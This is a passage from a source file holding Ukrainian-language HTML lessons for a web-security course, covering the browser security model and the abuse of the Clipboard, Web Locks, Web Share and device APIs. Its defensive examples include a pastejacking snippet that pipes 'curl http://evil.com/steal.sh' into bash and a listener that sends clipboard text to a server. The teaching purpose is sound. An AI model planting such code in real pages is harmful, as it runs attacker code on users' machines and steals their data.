// Lesson HTML content for the "web-security" course

export const LESSONS_HTML: Record<string, string> = {
  '01-browser-security-model': `
<article class="lesson-card">
      <h2>Що це таке?</h2>
      <p>Браузер — це найбільш атакована програма на вашому комп'ютері. Він щодня виконує код із тисяч різних сайтів і при цьому повинен захищати ваші паролі, банківські дані та приватне листування. Для цього в браузерах вбудовано багатошарову модель безпеки.</p>
      <p>Розуміння цієї моделі критично важливе для кожного веброзробника — і для того щоб не зламати захист користувача у власному коді, і для того щоб захистити свій застосунок від атак ззовні.</p>
    </article>

    <section class="analogy-block">
      <div class="analogy-block__title"><span class="analogy-block__icon">🏦</span> Браузер — як банк</div>
      <p>Уяви браузер як банківський офіс, де кожен клієнт (сайт) сидить у своїй окремій кабінці зі звуконепроникними стінками. Касир (браузер) передає гроші (дані) між кабінками тільки якщо обидві сторони явно підписали дозвіл. А служба безпеки (Permissions API) питає тебе щоразу, перш ніж дозволити комусь зайти до іншої кабінки.</p>
    </section>

    <section>
      <h2>Same-Origin Policy (SOP) — фундамент ізоляції</h2>
      <p>Це правило: скрипт, завантажений з одного «джерела» (origin = схема + домен + порт), <strong>не може</strong> читати дані з іншого джерела без явного дозволу.</p>

      <div class="code-block">
        <div class="code-block__head">
          <span class="code-block__dots"><span></span><span></span><span></span></span>
          <button class="copy-btn" data-copy aria-label="Копіювати код"></button>
        </div>
        <pre><code><span class="ln cmt">// Origin = scheme + host + port</span>
<span class="ln">https://example.com:443  ← ці два — РІЗНІ origins</span>
<span class="ln">https://api.example.com:443</span>
<span class="ln"></span>
<span class="ln cmt">// Дозволено: запит на той самий origin</span>
<span class="ln">fetch('/api/data')  // той самий домен — ОК</span>
<span class="ln"></span>
<span class="ln cmt">// Заблоковано: cross-origin без CORS-заголовків</span>
<span class="ln">fetch('https://api.other-site.com/data')  // ❌ CORS error</span></code></pre>
      </div>

      <h2>CORS — контрольований кросс-доменний доступ</h2>
      <div class="code-block">
        <div class="code-block__head">
          <span class="code-block__dots"><span></span><span></span><span></span></span>
          <button class="copy-btn" data-copy aria-label="Копіювати код"></button>
        </div>
        <pre><code><span class="ln cmt">// Сервер явно дозволяє доступ через HTTP-заголовки:</span>
<span class="ln">Access-Control-Allow-Origin: https://my-app.com</span>
<span class="ln">Access-Control-Allow-Methods: GET, POST</span>
<span class="ln">Access-Control-Allow-Headers: Content-Type, Authorization</span>
<span class="ln"></span>
<span class="ln cmt">// Wildcard — дозволяє всім (небезпечно для приватних API)</span>
<span class="ln">Access-Control-Allow-Origin: *  // ⚠️ тільки для публічних ресурсів</span></code></pre>
      </div>

      <h2>Content Security Policy (CSP) — захист від XSS</h2>
      <p>CSP — заголовок (або meta-тег), що вказує браузеру <em>звідки</em> можна завантажувати ресурси. Це унеможливлює виконання впровадженого зловмисниками коду.</p>
      <div class="code-block">
        <div class="code-block__head">
          <span class="code-block__dots"><span></span><span></span><span></span></span>
          <button class="copy-btn" data-copy aria-label="Копіювати код"></button>
        </div>
        <pre><code><span class="ln cmt"># HTTP-заголовок на сервері</span>
<span class="ln">Content-Security-Policy:</span>
<span class="ln">  default-src 'self';          /* лише свій домен */</span>
<span class="ln">  script-src 'self' cdn.example.com;  /* скрипти тільки звідси */</span>
<span class="ln">  img-src *;                   /* зображення — будь-де */</span>
<span class="ln">  style-src 'self' 'unsafe-inline'; /* стилі + inline */</span>
<span class="ln">  object-src 'none';           /* Flash та plugins — заблоковано */</span></code></pre>
      </div>

      <h2>Permissions API — явна згода користувача</h2>
      <p>Сучасні браузерні API, що мають доступ до чутливих ресурсів (<strong>камера, мікрофон, геолокація, буфер обміну</strong>), вимагають явного дозволу користувача. Без нього API просто не працює.</p>
      <div class="code-block">
        <div class="code-block__head">
          <span class="code-block__dots"><span></span><span></span><span></span></span>
          <button class="copy-btn" data-copy aria-label="Копіювати код"></button>
        </div>
        <pre><code><span class="ln cmt">// Перевірка поточного стану дозволу</span>
<span class="ln">const result = await navigator.permissions.query({ name: 'clipboard-read' });</span>
<span class="ln">console.log(result.state); // 'granted' | 'denied' | 'prompt'</span>
<span class="ln"></span>
<span class="ln cmt">// Запит дозволу (спрацьовує тільки в відповідь на дію користувача)</span>
<span class="ln">document.querySelector('#btn').addEventListener('click', async () => {</span>
<span class="ln">  const text = await navigator.clipboard.readText(); // покаже діалог</span>
<span class="ln">});</span></code></pre>
      </div>

      <h2>Нова категорія загроз: «безпечні» API як вектори атак</h2>
      <p>Протягом останніх 5 років у браузери додали десятки нових API для покращення UX. <strong>Кожен з них відкрив нові, несподівані вектори атак.</strong> У наступних уроках ми розглянемо 10 таких API та конкретні способи їх зловживання.</p>

      <div class="syntax-params">
        <h4>Категорії загроз, які ми вивчимо</h4>
        <table class="params-table">
          <thead><tr><th>Категорія</th><th>API</th><th>Тип загрози</th></tr></thead>
          <tbody>
            <tr><td>APIs дозволів</td><td>Web Locks, Web Share, Clipboard</td><td>DoS, соціальна інженерія, pastejacking</td></tr>
            <tr><td>Device APIs</td><td>Vibration, Wake Lock, EyeDropper, PiP</td><td>Фінгерпринтинг, UI spoofing, pixel stealing</td></tr>
            <tr><td>CSS & Пасивні</td><td>env(), lazy-loading, smooth scroll</td><td>Side-channel, JS-free tracking</td></tr>
          </tbody>
        </table>
      </div>

      <div class="doc-links">
        <h4>Офіційна документація та ресурси</h4>
        <ul>
          <li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener noreferrer">Same-Origin Policy — MDN</a></li>
          <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" target="_blank" rel="noopener noreferrer">CORS — MDN</a></li>
          <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank" rel="noopener noreferrer">Content Security Policy — MDN</a></li>
          <li><a href="https://web.dev/articles/permissions-api" target="_blank" rel="noopener noreferrer">Permissions API — web.dev</a></li>
          <li><a href="https://www.w3.org/TR/permissions/" target="_blank" rel="noopener noreferrer">Permissions API — W3C Specification</a></li>
        </ul>
      </div>
    </section>

    <section class="tip-block tip-block--warn">
      <div class="tip-block__title"><span>⚠️</span> Важливі принципи</div>
      <ul>
        <li><strong>HTTPS — обов'язковий</strong>: більшість чутливих API (геолокація, камера, clipboard, wake lock) недоступні на HTTP. Браузер блокує їх навіть без помилки в коді.</li>
        <li><strong>Дозволи — тільки за дією користувача</strong>: запит дозволу поза обробником кліку (або іншої user gesture) автоматично відхиляється браузером.</li>
        <li><strong>SOP не захищає від всього</strong>: CSRF-атаки (Cross-Site Request Forgery) можливі навіть при SOP — для захисту потрібні CSRF-токени та <code>SameSite</code> cookies.</li>
        <li><strong>CSP — не срібна куля</strong>: <code>'unsafe-inline'</code> повністю нівелює захист CSP від XSS. Якщо є такий рядок — CSP фактично не захищає.</li>
      </ul>
    </section>

    <section class="practice-block">
      <div class="practice-block__title"><span>⚡</span> Практика</div>
      <p class="practice-block__intro">Практичні завдання для закріплення матеріалу:</p>
      <ol>
        <li>Відкрий DevTools (F12) → вкладка Application → Storage. Порівняй що бачать скрипти з різних origin на сторінці з iframe.</li>
        <li>Переглянь заголовки відповіді будь-якого великого сайту (google.com, github.com) у DevTools → Network → будь-який запит → Response Headers. Знайди <code>Content-Security-Policy</code>.</li>
        <li>Перевір стан дозволів у браузері: <code>chrome://settings/content</code> — які сайти мають доступ до чого?</li>
        <li>Запусти <code>navigator.permissions.query({ name: 'geolocation' })</code> у консолі. Що повертає <code>state</code>?</li>
      </ol>
    </section>

    <section class="homework-block">
      <div class="homework-block__title"><span>📝</span> Запитання для самоперевірки</div>
      <ol>
        <li>Що таке «origin» в контексті SOP? Із чого він складається?</li>
        <li>Яка різниця між CORS і CSP? Що кожен захищає?</li>
        <li>Чому більшість чутливих API вимагають HTTPS і user gesture?</li>
        <li>Що таке CSRF-атака і чому SOP її не зупиняє?</li>
        <li>Що означає <code>Access-Control-Allow-Origin: *</code> і коли це небезпечно?</li>
      </ol>
    </section>

    <section class="hw-review-block">
      <div class="hw-review-block__title"><span>📋</span> Типові помилки на співбесідах</div>
      <div class="hw-review-items">
        <article class="hw-review-item">
          <h4 class="hw-review-item__task">Питання: «Що таке CORS і навіщо він?»</h4>
          <p class="hw-review-item__bad"><span class="hw-review-label">❌</span> «CORS — це помилка яку треба вимкнути» або «ставлю <code>Access-Control-Allow-Origin: *</code> і все працює».</p>
          <p class="hw-review-item__good"><span class="hw-review-label">✅</span> CORS — механізм, що дозволяє серверу контролювати які сторонні сайти можуть робити cross-origin запити. <code>*</code> підходить для публічних CDN, але для API що повертає дані користувача — треба вказувати конкретні дозволені origins.</p>
        </article>
        <article class="hw-review-item">
          <h4 class="hw-review-item__task">Питання: «Що таке XSS і як захиститись?»</h4>
          <p class="hw-review-item__bad"><span class="hw-review-label">❌</span> «Екранувати всі спецсимволи» — необхідно, але недостатньо.</p>
          <p class="hw-review-item__good"><span class="hw-review-label">✅</span> XSS — впровадження шкідливого скрипту на сторінку. Захист: (1) екранування виводу (HTML entity encoding), (2) CSP-заголовок що блокує inline-скрипти та сторонні джерела, (3) <code>HttpOnly</code> cookies щоб JS не міг вкрасти сесію.</p>
        </article>
        <article class="hw-review-item">
          <h4 class="hw-review-item__task">Питання: «Чому браузер блокує запит до API?»</h4>
          <p class="hw-review-item__bad"><span class="hw-review-label">❌</span> «Не знаю, disabled CORS у браузері через розширення».</p>
          <p class="hw-review-item__good"><span class="hw-review-label">✅</span> Браузер блокує cross-origin запити без відповідних CORS-заголовків на сервері. Рішення: налаштувати CORS на сервері, не в браузері. Вимкнення CORS у браузері — тільки для локальної розробки і ніколи в продакшені.</p>
        </article>
      </div>
    </section>

    <section class="pro-tips-block">
      <div class="pro-tips-block__title"><span>✨</span> Цікаві фішки</div>
      <ul>
        <li><code>Cross-Origin-Opener-Policy: same-origin</code> + <code>Cross-Origin-Embedder-Policy: require-corp</code> відкривають доступ до <code>SharedArrayBuffer</code> і вищоточних таймерів — але повністю ізолюють вкладку від сторонніх iframe.</li>
        <li><strong>Spectre (2018)</strong> — вразливість CPU, що дозволяла JavaScript зчитувати пам'ять інших вкладок. Саме через це браузери знизили точність <code>performance.now()</code> і обмежили <code>SharedArrayBuffer</code>.</li>
        <li><a href="https://securityheaders.com/" target="_blank" rel="noopener">securityheaders.com</a> — вставте URL і отримайте оцінку налаштування HTTP-заголовків безпеки вашого сайту за 30 секунд.</li>
        <li>Chrome DevTools → вкладка Security → показує деталі TLS-з'єднання, сертифікату і попередження про mixed content прямо для поточної сторінки.</li>
      </ul>
    </section>
`,
  '02-permission-apis': `
<article class="lesson-card">
      <h2>Що це таке?</h2>
      <p>Ці три API виглядають як зручні інструменти для розробника — і є ними. Але кожен має «темний бік»: зловмисник або скрипт, впроваджений через XSS, може перетворити їх на вектор атаки. Знати механізм — значить вміти захиститись.</p>
    </article>

    <section>
      <h2>🔒 1. Web Locks API (<code>navigator.locks.request</code>)</h2>

      <div class="analogy-block">
        <div class="analogy-block__title"><span class="analogy-block__icon">🚪</span> Аналогія: блокування дверей</div>
        <p>Web Locks дозволяє скрипту «захопити замок» на спільний ресурс. Якщо зловмисний скрипт захопив замок і ніколи його не відпускає — це як заблокувати вхідні двері зсередини.</p>
      </div>

      <div class="code-block">
        <div class="code-block__head">
          <span class="code-block__dots"><span></span><span></span><span></span></span>
          <button class="copy-btn" data-copy aria-label="Копіювати код"></button>
        </div>
        <pre><code><span class="ln cmt">// Легітимне використання — координація між вкладками</span>
<span class="ln">await navigator.locks.request('shared-db', async (lock) => {</span>
<span class="ln">  // виконуємо роботу...</span>
<span class="ln">  await updateIndexedDB();</span>
<span class="ln">  // замок звільняється автоматично при поверненні з функції</span>
<span class="ln">});</span>
<span class="ln"></span>
<span class="ln cmt">// ⚠️ Атака: XSS-скрипт захоплює замок НАЗАВЖДИ</span>
<span class="ln">navigator.locks.request('shared-db', { mode: 'exclusive' }, () => {</span>
<span class="ln">  return new Promise(() => {}); // Promise що ніколи не resolves</span>
<span class="ln">  // Результат: всі інші вкладки вашого додатку заблоковані</span>
<span class="ln">});</span></code></pre>
      </div>

      <div class="syntax-params">
        <h4>Вразливості Web Locks API</h4>
        <table class="params-table">
          <thead><tr><th>Загроза</th><th>Механізм</th><th>Наслідок</th></tr></thead>
          <tbody>
            <tr>
              <td>Клієнтський DoS</td>
              <td>XSS-скрипт запитує exclusive lock і ніколи не завершується</td>
              <td>Всі вкладки додатку заморожені, не можуть записувати в IndexedDB</td>
            </tr>
            <tr>
              <td>Cross-Origin Tracking</td>
              <td>Якщо браузер не ізолює менеджер блокувань між domains</td>
              <td>Сторонні iframe можуть відстежувати поведінку користувача між вкладками</td>
            </tr>
          </tbody>
        </table>
      </div>

      <div class="tip-block tip-block--warn" style="margin-top: 16px;">
        <div class="tip-block__title"><span>🛡️</span> Як захиститись</div>
        <ul>
          <li>Завжди встановлюй <strong>timeout</strong> на Lock-запити через <code>AbortController</code></li>
          <li>Жорстко контролюй вхідні дані та впроваджуй CSP щоб XSS не міг виконати зовнішній код</li>
          <li>Використовуй унікальні, важко-вгадувані імена замків (не <code>'db'</code>, а <code>'db-v2-prod-a7f3k'</code>)</li>
        </ul>
      </div>
    </section>

    <section>
      <h2>📤 2. Web Share API (<code>navigator.share</code>)</h2>

      <div class="analogy-block">
        <div class="analogy-block__title"><span class="analogy-block__icon">🪤</span> Аналогія: підписати документ не читаючи</div>
        <p>Clickjacking із Web Share — як підписати щось не бачачи що підписуєш. Кнопка на екрані виглядає як «Переглянути» але насправді відкриває системний діалог «Поділитись» з підготовленим шкідливим файлом.</p>
      </div>

      <div class="code-block">
        <div class="code-block__head">
          <span class="code-block__dots"><span></span><span></span><span></span></span>
          <button class="copy-btn" data-copy aria-label="Копіювати код"></button>
        </div>
        <pre><code><span class="ln cmt">// Легітимне використання</span>
<span class="ln">await navigator.share({</span>
<span class="ln">  title: 'Цікава стаття',</span>
<span class="ln">  text: 'Подивись що я знайшов',</span>
<span class="ln">  url: 'https://example.com/article'</span>
<span class="ln">});</span>
<span class="ln"></span>
<span class="ln cmt">// ⚠️ Атака 1: Clickjacking — передача шкідливого файлу</span>
<span class="ln">// Невидима кнопка поверх привабливого контенту</span>
<span class="ln">// При кліку відкривається share з files: [maliciousBlob]</span>
<span class="ln">await navigator.share({</span>
<span class="ln">  files: [new File([exploit], 'invoice.pdf', {type: 'application/pdf'})],</span>
<span class="ln">  title: 'Рахунок'</span>
<span class="ln">});</span>
<span class="ln"></span>
<span class="ln cmt">// ⚠️ Атака 2: Соціальна інженерія — поширення URL з токеном</span>
<span class="ln">// Сайт обманом змушує поділитись URL що містить:</span>
<span class="ln">// ?reset_token=abc123&session=private</span></code></pre>
      </div>

      <div class="syntax-params">
        <h4>Вразливості Web Share API</h4>
        <table class="params-table">
          <thead><tr><th>Загроза</th><th>Механізм</th><th>Наслідок</th></tr></thead>
          <tbody>
            <tr>
              <td>Payload Distribution</td>
              <td>Clickjacking-кнопка відкриває share з шкідливим файлом у <code>files[]</code></td>
              <td>Жертва надсилає exploit контактам через мессенджери</td>
            </tr>
            <tr>
              <td>Соціальна інженерія</td>
              <td>Спонукання поділитись URL з одноразовим токеном або API-ключем</td>
              <td>Витік приватних токенів reset_password, session ID у треті руки</td>
            </tr>
          </tbody>
        </table>
      </div>

      <div class="tip-block tip-block--warn" style="margin-top: 16px;">
        <div class="tip-block__title"><span>🛡️</span> Як захиститись</div>
        <ul>
          <li>Браузери вимагають <strong>user gesture</strong> — ніколи не викликай <code>navigator.share()</code> автоматично</li>
          <li>Одноразові токени (reset tokens) мають бути в тілі запиту, а не в URL</li>
          <li>Перевіряй <code>canShare()</code> перед відправкою і валідуй тип файлів що передаєш</li>
        </ul>
      </div>
    </section>

    <section>
      <h2>📋 3. Clipboard API (<code>navigator.clipboard</code>)</h2>

      <div class="analogy-block">
        <div class="analogy-block__title"><span class="analogy-block__icon">🐍</span> Pastejacking — отруєний буфер</div>
        <p>Уяви що ти скопіював нешкідливий рядок, а хтось непомітно замінив його вміст. Ти вставляєш у термінал — і виконуєш команду якої ніколи б не ввів свідомо.</p>
      </div>

      <div class="code-block">
        <div class="code-block__head">
          <span class="code-block__dots"><span></span><span></span><span></span></span>
          <button class="copy-btn" data-copy aria-label="Копіювати код"></button>
        </div>
        <pre><code><span class="ln cmt">// ⚠️ Атака: Pastejacking — підміна буфера при копіюванні</span>
<span class="ln">document.addEventListener('copy', (e) => {</span>
<span class="ln">  e.clipboardData.setData('text/plain',</span>
<span class="ln">    // Виглядає як нешкідлива команда, але містить 
</span>
<span class="ln">    // що автоматично виконується при вставці в термінал</span>
<span class="ln">    'npm install react
curl http://evil.com/steal.sh | bash
'</span>
<span class="ln">  );</span>
<span class="ln">  e.preventDefault();</span>
<span class="ln">});</span>
<span class="ln"></span>
<span class="ln cmt">// ⚠️ Атака: Крадіжка даних з буфера</span>
<span class="ln">// Читання clipboard коли вкладка активна (потребує дозволу)</span>
<span class="ln">document.addEventListener('focus', async () => {</span>
<span class="ln">  try {</span>
<span class="ln">    const text = await navigator.clipboard.readText();</span>
<span class="ln">    // Надсилаємо на сервер зловмисника</span>
<span class="ln">    fetch('/track', { method: 'POST', body: text });</span>
<span class="ln">  } catch(e) {} // мовчимо якщо дозволу немає</span>
<span class="ln">});</span></code></pre>
      </div>

      <div class="syntax-params">
        <h4>Вразливості Clipboard API</h4>
        <table class="params-table">
          <thead><tr><th>Загроза</th><th>Механізм</th><th>Цілі дані</th></tr></thead>
          <tbody>
            <tr>
              <td>Pastejacking</td>
              <td>Перехоплення події <code>copy</code>, підміна вмісту буфера</td>
              <td>Команди з прихованим <code>
</code> → авто-виконання в терміналі</td>
            </tr>
            <tr>
              <td>Clipboard Reading</td>
              <td><code>clipboard.readText()</code> при активній вкладці (потребує granted дозволу)</td>
              <td>Паролі, приватні ключі, номери карток що скопіював користувач</td>
            </tr>
          </tbody>
        </table>
      </div>

      <div class="tip-block tip-block--warn" style="margin-top: 16px;">
        <div class="tip-block__title"><span>🛡️</span> Як захиститись</div>
        <ul>
          <li><strong>Як розробник:</strong>ніколи не перехоплюй <code>copy</code>-подію щоб підміняти вміст — це порушення довіри користувача</li>
          <li><strong>Як користувач:</strong> у терміналі завжди перевіряй буфер через <code>cat</code> перед виконанням скопійованих команд з інтернету</li>
          <li>Браузери вимагають явного дозволу <code>'clipboard-read'</code> — регулярно переглядай і відкликай непотрібні дозволи в налаштуваннях браузера</li>
          <li><strong>Password managers</strong> мають власний захист буфера — авто-очищення через 30–60 секунд</li>
        </ul>
      </div>
    </section>

    <section class="tip-block tip-block--warn">
      <div class="tip-block__title"><span>⚠️</span> Загальні типові помилки</div>
      <ul>
        <li><strong>«Дозволи = безпека»</strong>: дозвіл користувача захищає від зовнішнього доступу, але не від XSS-скрипту що вже виконується на сторінці — він успадковує всі дозволи.</li>
        <li><strong>Довіра до вмісту clipboard</strong>: ніколи не вставляй код з інтернету напряму в термінал — завжди перевіряй що саме в буфері.</li>
        <li><strong>Ігнорування <code>canShare()</code></strong>: перед викликом <code>navigator.share()</code> завжди перевіряй чи підтримується тип даних.</li>
      </ul>
    </section>

    <section class="practice-block">
      <div class="practice-block__title"><span>⚡</span> Практика</div>
      <p class="practice-block__intro">Досліди APIs у DevTools консолі (F12):</p>
      <ol>
        <li>Виконай <code>navigator.locks.query()</code> у консолі — подивись на <code>held</code> і <code>pending</code> замки поточної сторінки.</li>
        <li>Спробуй <code>await navigator.permissions.query({ name: "clipboard-read" })</code> — який стан дозволу?</li>
        <li>Відкрий <a href="https://requestcontrolapp.com/pastejacking-demo" target="_blank" rel="noopener">демо pastejacking</a> (або знайди будь-яке демо) — вставь скопійоване в текстовий редактор, подивись що реально в буфері.</li>
        <li>Перевір які сайти мають clipboard-доступ: <code>chrome://settings/content/clipboard</code></li>
      </ol>
    </section>

    <section class="homework-block">
      <div class="homework-block__title"><span>📝</span> Запитання для самоперевірки</div>
      <ol>
        <li>Яким чином XSS-скрипт може виконати DoS через Web Locks API?</li>
        <li>Що таке Pastejacking і чому він небезпечний для розробників що копіюють команди?</li>
        <li>Чому дозвіл користувача на читання clipboard не захищає від XSS?</li>
        <li>Як соціальна інженерія через Web Share може призвести до витоку приватних токенів?</li>
        <li>Що потрібно перевірити перед тим як копіювати команду з GitHub/StackOverflow і вставляти в термінал?</li>
      </ol>
    </section>

    <section class="hw-review-block">
      <div class="hw-review-block__title"><span>📋</span> Типові помилки на співбесідах</div>
      <div class="hw-review-items">
        <article class="hw-review-item">
          <h4 class="hw-review-item__task">Питання: «Що таке Clipboard hijacking?»</h4>
          <p class="hw-review-item__bad"><span class="hw-review-label">❌</span> «Сайт читає мій буфер» — неповна відповідь, найнебезпечніший вектор інший.</p>
          <p class="hw-review-item__good"><span class="hw-review-label">✅</span> Є два вектори: (1) <strong>Pastejacking</strong> — перехоплення події <code>copy</code> і підміна скопійованого тексту без відома користувача. Особливо небезпечно для команд CLI. (2) <strong>Читання буфера</strong> — через <code>clipboard.readText()</code>, але потребує явного дозволу.</p>
        </article>
        <article class="hw-review-item">
          <h4 class="hw-review-item__task">Питання: «Як захистити IndexedDB від DoS між вкладками?»</h4>
          <p class="hw-review-item__bad"><span class="hw-review-label">❌</span> «IndexedDB не потребує захисту, він в браузері».</p>
          <p class="hw-review-item__good"><span class="hw-review-label">✅</span> Web Locks API координує доступ між вкладками. Захист: (1) встановити timeout через <code>AbortController</code> щоб зависший Lock автоматично відпускався, (2) CSP і XSS-захист щоб сторонній код не міг захопити Lock, (3) моніторинг через <code>navigator.locks.query()</code>.</p>
        </article>
      </div>
    </section>

    <section class="pro-tips-block">
      <div class="pro-tips-block__title"><span>✨</span> Цікаві фішки</div>
      <ul>
        <li>Розширення браузера мають <em>більше</em> прав ніж сторінки — вони можуть читати clipboard без дозволу у деяких браузерах. Перевіряй розширення перед встановленням.</li>
        <li><code>navigator.locks.query()</code> — безпечний API для моніторингу: показує всі активні та очікуючі замки. Корисно для дебагу.</li>
        <li>Firefox обмежує Web Share API тільки для HTTPS і вимагає user gesture — одна з найсуворіших реалізацій серед браузерів.</li>
        <li>Специфікація W3C Web Share явно вказує: файли у <code>share()</code> мають проходити валідацію типу. Браузери блокують небезпечні MIME-типи.</li>
      </ul>
    </section>
`,
  '03-device-apis': `
<article class="lesson-card">
      <h2>Що це таке?</h2>
      <p>Device APIs дають браузерному коду доступ до фізичних можливостей пристрою. Це відкриває унікальні вектори загроз: від непомітного фінгерпринтингу через вібрацію до викрадення пікселів з екрана через «піпетку» кольору та ідеальних фішингових вікон без адресного рядка.</p>
    </article>

    <section>
      <h2>📳 1. Vibration API (<code>navigator.vibrate</code>)</h2>

      <div class="analogy-block">
        <div class="analogy-block__title"><span class="analogy-block__icon">👆</span> Аналогія: унікальний відбиток пальця</div>
        <p>Кожен вібродвигун вібрує трохи по-різному — мікросекундні відхилення є унікальними для кожного пристрою. Виміряти ці відхилення — все одно що зняти відбиток пальця без відома людини.</p>
      </div>

      <div class="code-block">
        <div class="code-block__head">
          <span class="code-block__dots"><span></span><span></span><span></span></span>
          <button class="copy-btn" data-copy aria-label="Копіювати код"></button>
        </div>
        <pre><code><span class="ln cmt">// Легітимне використання — тактильний зворотній звʼязок</span>
<span class="ln">navigator.vibrate(200);          // 200ms вібрація</span>
<span class="ln">navigator.vibrate([100, 50, 100]); // вібрація - пауза - вібрація</span>
<span class="ln"></span>
<span class="ln cmt">// ⚠️ Атака 1: Hardware Fingerprinting</span>
<span class="ln">// Вимірювання затримки реакції на вібрацію через DeviceMotion</span>
<span class="ln">// для побудови унікального fingerprint пристрою</span>
<span class="ln">window.addEventListener('devicemotion', (e) => {</span>
<span class="ln">  // Збираємо мікросекундні характеристики акселерометра</span>
<span class="ln">  const signature = hashVibrationResponse(e.acceleration);</span>
<span class="ln">  // Відправляємо на tracking сервер</span>
<span class="ln">});</span>
<span class="ln">navigator.vibrate([50, 10, 50, 10, 50]); // провокуємо унікальну реакцію</span>
<span class="ln"></span>
<span class="ln cmt">// ⚠️ Атака 2: Scareware — імітація системного попередження</span>
<span class="ln">// Сайт викликає тривожну вібрацію + показує фейковий alert</span>
<span class="ln">navigator.vibrate([500, 100, 500, 100, 500]);</span>
<span class="ln">// "Ваш телефон заражено! Встановіть антивірус негайно!"</span></code></pre>
      </div>

      <div class="syntax-params">
        <h4>Вразливості Vibration API</h4>
        <table class="params-table">
          <thead><tr><th>Загроза</th><th>Механізм</th><th>Наслідок</th></tr></thead>
          <tbody>
            <tr>
              <td>Hardware Fingerprinting</td>
              <td>Вимірювання унікальних фізичних характеристик вібродвигуна через DeviceMotion</td>
              <td>Стеження без cookies, стійке до очищення браузера та VPN</td>
            </tr>
            <tr>
              <td>Scareware / Фішинг</td>
              <td>Тривожна вібрація + фейковий overlay «вірус знайдено»</td>
              <td>Паніка → встановлення шкідливого ПЗ або передача грошей</td>
            </tr>
          </tbody>
        </table>
      </div>

      <div class="tip-block tip-block--warn" style="margin-top: 16px;">
        <div class="tip-block__title"><span>🛡️</span> Захист</div>
        <ul>
          <li>Firefox і Safari обмежують або повністю блокують Vibration API — Chrome більш ліберальний</li>
          <li>Специфікація W3C вимагає user gesture для вібрації — але не всі браузери це дотримуються суворо</li>
          <li>Якщо бачиш вібрацію без очевидної причини (натискання кнопки, сповіщення) — закривай вкладку</li>
        </ul>
      </div>
    </section>

    <section>
      <h2>🔆 2. Screen Wake Lock API (<code>navigator.wakeLock.request</code>)</h2>

      <div class="analogy-block">
        <div class="analogy-block__title"><span class="analogy-block__icon">🔓</span> Аналогія: заблокований замок готельного номера</div>
        <p>Уяви: ти виходиш з готелю і залишаєш ноутбук. Нормально — замок вмикається автоматично. Але шкідливий сайт у фоновій вкладці утримує «замок» відкритим — будь-хто може зайти.</p>
      </div>

      <div class="code-block">
        <div class="code-block__head">
          <span class="code-block__dots"><span></span><span></span><span></span></span>
          <button class="copy-btn" data-copy aria-label="Копіювати код"></button>
        </div>
        <pre><code><span class="ln cmt">// Легітимне використання — презентація, відео-плеєр</span>
<span class="ln">let wakeLock = null;</span>
<span class="ln">try {</span>
<span class="ln">  wakeLock = await navigator.wakeLock.request('screen');</span>
<span class="ln">  // Екран не гасне поки активна ця вкладка</span>
<span class="ln">} catch (e) { console.error(e); }</span>
<span class="ln"></span>
<span class="ln cmt">// ⚠️ Атака 1: Фізична безпека</span>
<span class="ln">// Шкідливий сайт у фоновій вкладці тримає wakeLock активним</span>
<span class="ln">// Пристрій залишений без нагляду — екран НЕ блокується</span>
<span class="ln">// Сторонні особи отримують доступ до відкритих додатків</span>
<span class="ln"></span>
<span class="ln cmt">// ⚠️ Атака 2: Ресурсний DoS</span>
<span class="ln">// Постійно активний екран = критичний перегрів + батарея</span>
<span class="ln">// Особливо небезпечно для мобільних пристроїв</span>
<span class="ln">// OLED-екрани — вигорання пікселів при тривалому статичному зображенні</span></code></pre>
      </div>

      <div class="tip-block tip-block--warn" style="margin-top: 16px;">
        <div class="tip-block__title"><span>🛡️</span> Захист</div>
        <ul>
          <li>Wake Lock автоматично скидається коли вкладка йде у фон — але <strong>не коли браузер повноекранний</strong></li>
          <li>Перевіряй <code>chrome://settings/content/wakeLock</code> — які сайти мають постійний дозвіл</li>
          <li>Не залишай браузер відкритим у публічних місцях — навіть «заблокований» екран OS не захистить від Wake Lock</li>
        </ul>
      </div>
    </section>

    <section>
      <h2>🎨 3. EyeDropper API (та <code>&lt;input type="color"&gt;</code>)</h2>

      <div class="analogy-block">
        <div class="analogy-block__title"><span class="analogy-block__icon">🔍</span> Аналогія: підглядання через замкову щілину</div>
        <p>EyeDropper дозволяє вибрати колір <em>будь-де на екрані</em> — навіть у сусідніх вікнах. Це як отримати підзорну трубу що дивиться крізь стіни між додатками.</p>
      </div>

      <div class="code-block">
        <div class="code-block__head">
          <span class="code-block__dots"><span></span><span></span><span></span></span>
          <button class="copy-btn" data-copy aria-label="Копіювати код"></button>
        </div>
        <pre><code><span class="ln cmt">// Легітимне використання</span>
<span class="ln">const eyeDropper = new EyeDropper();</span>
<span class="ln">const result = await eyeDropper.open();</span>
<span class="ln">console.log(result.sRGBHex); // наприклад '#ff6b6b'</span>
<span class="ln"></span>
<span class="ln cmt">// ⚠️ Атака: Cross-Origin Pixel Stealing</span>
<span class="ln">// 1. Зловмисна сторінка відкриває EyeDropper</span>
<span class="ln">// 2. Через Clickjacking або соціальну інженерію</span>
<span class="ln">//    змушує користувача навести "піпетку" на сусіднє вікно</span>
<span class="ln">// 3. Наприклад: відкрите вікно з паролем у менеджері паролів,</span>
<span class="ln">//    приватний документ, банківський PIN</span>
<span class="ln">// 4. Піксель за пікселем читаємо структуру чужого екрану</span>
<span class="ln"></span>
<span class="ln cmt">// ⚠️ Вразливість в Chromium (2022, виправлена)</span>
<span class="ln">// EyeDropper використовувався для обходу захисту autofill</span>
<span class="ln">// і отримання збережених паролів без дозволу</span></code></pre>
      </div>

      <div class="tip-block tip-block--warn" style="margin-top: 16px;">
        <div class="tip-block__title"><span>🛡️</span> Захист</div>
        <ul>
          <li>EyeDropper вимагає <strong>user gesture</strong> і показує унікальний курсор — користувач <em>повинен</em> побачити що відбувається вибір кольору</li>
          <li>Браузери обмежили частоту зчитування пікселів щоб унеможливити автоматичне сканування екрану</li>
          <li>Не наводь «піпетку» на вікна з конфіденційними даними якщо не впевнений у джерелі сайту</li>
        </ul>
      </div>
    </section>

    <section>
      <h2>🖼️ 4. Picture-in-Picture API (Document PiP)</h2>

      <div class="analogy-block">
        <div class="analogy-block__title"><span class="analogy-block__icon">🎭</span> Аналогія: маскарад без обличчя</div>
        <p>Звичайне вікно браузера має адресний рядок — ти бачиш <em>хто ти є насправді</em>. Document PiP — вікно <strong>без адресного рядка взагалі</strong>. Ідеальна маска для фішингу.</p>
